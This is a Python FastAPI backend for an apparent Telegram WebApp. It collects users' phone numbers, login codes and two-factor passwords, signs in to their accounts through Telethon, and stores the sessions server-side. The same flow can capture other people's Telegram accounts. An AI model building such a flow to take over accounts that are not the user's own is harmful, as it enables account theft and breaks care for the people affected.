from loader import *
from fastapi import FastAPI, HTTPException
from fastapi.requests import Request
from telethon import TelegramClient
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneCodeExpiredError,
)
import os
from utils.webapp_func.webapp_models import *
from utils.webapp_func.otherfunc import clear_phone_number
from utils.tg_functions.tg_func import get_client
from utils.webapp_func.auth_webapp import *
from cachetools import TTLCache
from datetime import datetime
from loguru import logger


class CustomTTLCache(TTLCache):
    def __init__(self, maxsize, ttl, on_eviction=None, *args, **kwargs):
        super().__init__(maxsize, ttl, *args, **kwargs)
        self.on_eviction = on_eviction

    def popitem(self):
        key, value = super().popitem()
        if self.on_eviction:
            self.on_eviction(key, value)
        return key, value


def on_cache_eviction(key, value):
    client: TelegramClient = value.get("client")
    if client and client.is_connected():
        logger.info(f"Disconnecting client for user {key}")
        client.disconnect()


user_session_cache = CustomTTLCache(maxsize=10000, ttl=600, on_eviction=on_cache_eviction)


@app.get('/auth_account')
@authenticate
async def main_page(request: Request, initData: str, user: object = None, unsafeUser: object = None):
    user_session_cache.pop(user['_id'], None)
    return templates.TemplateResponse('authorization.html', {'request': request})


@app.get('/enter_code/{phone_number}')
async def enter_code_auth_page(request: Request, phone_number: str, initData: str, user: object = None, unsafeUser: object = None):
    return templates.TemplateResponse("enter_code.html", {"request": request, "phone_number": phone_number})


@app.post("/get_code")
@authenticate
async def auth_tg_endpoint(request: Request, request_data: SendCode, user: object = None, unsafeUser: object = None):
    if not request_data.phone_number:
        raise HTTPException(status_code=400, detail="Phone number is required")

    phone_number = clear_phone_number(request_data.phone_number)
    if phone_number is False:
        raise HTTPException(status_code=400, detail="Введите корректный номер телефона")

    settings = await db.get_settings()
    client: TelegramClient = await get_client(str(phone_number), settings['api_id'], settings['api_hash'])

    try:
        if await client.is_user_authorized():
            me = await client.get_me()

            await db.update_account_info_by_phone_number(str(phone_number), int(me.id), me.first_name or "", me.username or "")
            await client.disconnect()
            
            return {"status": 200, "result": "success"}

        result = await client.send_code_request(phone_number)
        await db.add_account(phone_number, str(result.phone_code_hash))

        user_session_cache[user['_id']] = {
            "phone_number": phone_number,
            "phone_code_hash": str(result.phone_code_hash),
            "client": client,
            "created_at": datetime.now()
        }

        return {"status": 200, "result": "wait_enter_code"}

    except FloodWaitError as e:
        await client.disconnect()
        raise HTTPException(status_code=429, detail=f"Flood wait error: {e}")


@app.post("/verify-code")
@authenticate
async def check_code_endpoint(request: Request, request_data: VerifyCode, user: object = None, unsafeUser: object = None):

    if not request_data.code:
        raise HTTPException(status_code=400, detail="Auth code is required")

    code = request_data.code

    if len(str(code)) > 5:
        raise HTTPException(status_code=400, detail="Неверный формат кода")

    cached_data = user_session_cache.get(user['_id'])
    if not cached_data:
        raise HTTPException(status_code=400, detail="Session expired. Please request a new code.")

    user_session_cache[user['_id']] = cached_data
    client: TelegramClient = cached_data["client"]
    phone_code_hash = cached_data["phone_code_hash"]
    phone_number = cached_data["phone_number"]

    try:
        await client.sign_in(phone=phone_number, code=code, phone_code_hash=phone_code_hash)

        if await client.is_user_authorized():
            me = await client.get_me()
            
            await db.update_account_info_by_phone_number(str(phone_number), int(me.id), me.first_name or "", me.username or "")
            del user_session_cache[user['_id']]
        
            return {"status": 200, "result": "success"}

        logger.warning('2ФА')
        return {"status": 200, "result": "2fa_required"}

    except PhoneCodeInvalidError:
        raise HTTPException(status_code=400, detail="Invalid code. Please try again.")
    except PhoneCodeExpiredError:
        raise HTTPException(status_code=400, detail="The confirmation code has expired. Please request a new one.")
    except SessionPasswordNeededError:
        logger.warning('2ФА')
        return {"status": 200, "result": "2fa_required"}


@app.post("/auth_2fa")
@authenticate
async def auth_2fa(request: Request, request_data: Auth2FARequest, user: object = None, unsafeUser: object = None):
    
    password = request_data.two_fa_code

    cached_data = user_session_cache.get(user['_id'])
    if not cached_data:
        raise HTTPException(status_code=400, detail="Session expired. Please start over.")

    client: TelegramClient = cached_data["client"]

    try:
        await client.sign_in(password=password)

        if await client.is_user_authorized():
            me = await client.get_me()
            del user_session_cache[user['_id']]
            return {"status": 200, "result": "success"}

        raise HTTPException(status_code=400, detail="Failed to authorize with 2FA.")

    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Error during 2FA authorization: {str(e)}")

